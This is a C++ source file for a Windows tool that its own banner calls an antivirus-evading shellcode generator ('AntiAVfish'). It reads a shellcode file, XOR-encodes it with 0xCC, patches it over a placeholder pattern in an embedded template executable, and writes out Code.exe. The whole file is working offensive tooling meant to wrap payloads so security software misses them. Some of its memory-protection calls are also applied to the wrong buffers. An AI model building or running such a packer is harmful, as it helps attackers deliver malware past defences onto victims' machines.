#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include "resource.h"

using namespace std;
const void* pattern = (const void*)"\x11\x22\x33\x44\x55\x66\x77\x88\x99";

// 用于在一堆内存中查找模式的函数
void* memmem(const void* haystack, size_t haystack_len, const void* const needle, const size_t needle_len)
{
	if (haystack == NULL) return NULL;
	if (haystack_len == 0) return NULL;
	if (needle == NULL) return NULL;;
	if (needle_len == 0) return NULL;

	DWORDLONG offset = 0;
	for (const char* h = (const char*)haystack; haystack_len >= needle_len; ++h, --haystack_len, ++offset) {
		if (!memcmp(h, needle, needle_len)) {
			//return offset;
			return (void*)h;
		}
	}
	return NULL;
}

DWORD GetFileContents(LPCSTR filename, LPSTR* data, DWORD& size)
{
	std::FILE* fp = std::fopen(filename, "rb");

	if (fp)
	{
		fseek(fp, 0, SEEK_END);
		size = ftell(fp);
		fseek(fp, 0, SEEK_SET);

		*data = (LPSTR)malloc(size + 1);
		fread(*data, size, 1, fp);
		fclose(fp);
		return true;
	}
	return false;
}


int main(int argc, char** argv) {
	printf("免杀Shellcode生成器_x64    请使用x64平台运行的shellcode)\r\n");
	printf("使用方式:EvilVH.exe  当前目录下shellcode二进制文件的文件名\r\n");
	printf("例:AntiAVfish_x64.exe  payload.bin\r\n");
	printf("Author: Dogshuang\r\n");
	printf("|A|n|t|i|A|V|f|i|s|h|\r\n");
	printf("                    \r\n");
	printf("                    \r\n");
	printf("                    \r\n");

	if (argc < 2)
	{
		system("pause");
		exit(1);
	}

	char** temp = argv;  /* 保留argv */
	int i = 0;
	while (*temp != NULL) {
		if (i == 1)
		{
			break;
		}
		++temp;
		i++;
	}
	DWORD oldbyte;

	char* Temp = *temp;
	int BufLen = strlen(Temp);
	int k;


	LPSTR buffer = NULL;
	DWORD bufferSize;
	cout << *temp << endl;
	DWORD result = GetFileContents(*temp, &buffer, bufferSize);  //将数据读入buffer

	if (!result || buffer == NULL) {
		printf("[!] Cannot read file.");
		system("pause");
		return 1;
	}

	int iRet = VirtualProtect(*temp, BufLen, PAGE_READWRITE, &oldbyte);
	for (int i = 0; i < bufferSize; i++)
	{
		*((char*)(buffer + i)) ^= 0xCC;
		continue;
	}

	HRSRC Resource = FindResource(NULL, MAKEINTRESOURCE(IDR_BIN1), "BIN");
	DWORD Size = SizeofResource(NULL, Resource);
	HGLOBAL Data = LoadResource(NULL, Resource);

	DWORD oldSize;
	char* ReadMemory = new char[Size + 1];
	memcpy(ReadMemory, Data, Size);

	void* DstReadMemory = memmem(ReadMemory, Size, pattern, 9);
	k = VirtualProtect(DstReadMemory, BufLen, PAGE_READWRITE, &oldbyte);
	memcpy(DstReadMemory, buffer, bufferSize);

	k = VirtualProtect(ReadMemory, Size, PAGE_READWRITE, &oldbyte);
	ofstream ofs;
	ofs.open("Code.exe", ios_base::out | ios_base::binary);
	ofs.write(ReadMemory, Size);
	ofs.close();

	cout << "成功在当前目录下生成exe" << endl;
	system("pause");

	return 0;
}

